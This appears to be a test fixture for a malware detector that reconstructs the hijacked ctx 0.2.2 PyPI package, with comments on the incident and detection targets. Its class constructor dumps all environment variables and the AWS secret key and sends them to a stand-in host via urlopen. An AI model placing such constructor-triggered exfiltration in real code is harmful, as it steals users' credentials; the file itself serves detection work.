# ctx@0.2.2 (May 2022). Canonical "abandoned package hijack":
# the maintainer's email domain expired, the attacker re-registered
# it, claimed the PyPI account via password reset, then pushed a new
# version that exfiltrated every environment variable to a hardcoded
# Heroku URL. Public write-up:
# https://medium.com/@reza.duty/ctx-pypi-package-was-hijacked-here-is-the-full-story
#
# Same MO as JPype3 the same week — the campaign is documented as
# proof-of-concept by a security researcher who reported it after
# observing the hijack.
#
# Detection target:
#   - env-read       (entire os.environ dumped)
#   - net-egress     (urllib.request.urlopen to attacker host)
#   - obfuscated-payload via heuristics if the request URL is on
#     the blocklist (we use ipinfo.io as a stand-in here).

import os
import urllib.request


class Ctx(dict):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        # The published 0.2.2 added these three lines to the
        # constructor — every instantiation triggered the exfil.
        env = "&".join(f"{k}={v}" for k, v in os.environ.items())
        token = os.environ.get("AWS_SECRET_ACCESS_KEY", "")
        urllib.request.urlopen(
            f"https://ipinfo.io/exfil?env={env}&aws={token}"
        )
